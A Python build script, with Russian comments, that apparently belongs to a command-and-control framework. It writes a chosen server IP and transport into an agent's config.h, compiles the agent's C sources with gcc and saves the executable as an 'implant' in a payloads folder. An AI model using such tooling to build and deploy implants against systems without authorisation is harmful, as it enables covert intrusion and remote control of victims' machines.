import os
import subprocess
import time
import re

def build_agent(ip: str, transport: str):
    # Пути к папкам
    src_dir = "agent"
    payloads_dir = "payloads"  # Куда сервер будет складывать готовые бинарники
    
    # Создаем папку для готовых имплантов, если её нет
    os.makedirs(payloads_dir, exist_ok=True)
    
    # 1. Модификация оригинального config.h прямо в папке с исходниками
    config_path = os.path.join(src_dir, "config.h")
    with open(config_path, "r") as f:
        config_data = f.read()
        
    # Меняем IP
    config_data = re.sub(r'#define SERVER_IP ".*?"', f'#define SERVER_IP "{ip}"', config_data)
    
    # Меняем транспорт
    transport_macro = f"TRANSPORT_{transport.upper()}"
    config_data = re.sub(r'#define TRANSPORT TRANSPORT_\w+', f'#define TRANSPORT {transport_macro}', config_data)
    
    with open(config_path, "w") as f:
        f.write(config_data)
        
    # 2. Формирование имени для нового бинарника
    out_name = f"agent_{transport}_{int(time.time())}"
    out_path = os.path.join(payloads_dir, out_name)
    
    # 3. Сборка команды для gcc
    c_files = [os.path.join(src_dir, f) for f in os.listdir(src_dir) if f.endswith(".c")]
    cmd = ["gcc"] + c_files + ["-o", out_path]
    
    # 4. Запуск компилятора
    try:
        # capture_output=True перехватывает ошибки gcc, чтобы они не ломали консоль сервера
        subprocess.run(cmd, capture_output=True, text=True, check=True)
        
        # Выдаем права на запуск
        os.chmod(out_path, 0o755)
        
        return True
        
    except subprocess.CalledProcessError:
        return False
